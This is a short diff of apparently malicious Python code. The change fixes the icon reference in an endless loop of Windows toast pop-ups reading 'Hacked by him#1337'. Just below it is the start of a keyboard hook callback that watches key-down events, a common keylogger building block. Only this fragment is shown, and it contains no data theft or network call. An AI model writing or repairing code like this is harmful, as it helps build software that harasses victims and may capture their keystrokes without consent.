@@ -53,7 +53,7 @@ class Threadlib:
         toaster.icon_path = Threadlib.resource_path(resource.folder+'ybj.ico')
         while True:
             toaster.show_toast("Hacked by him#1337", Threadlib.text[random.randint(0,3)],
-                               duration=5,icon_path=Threadlib.toast.icon_path)
+                               duration=5,icon_path=toaster.icon_path)
     @classmethod
     def hook_callback(nCode, wParam, lParam):
         if wParam == Threadlib.WM_KEYDOWN:
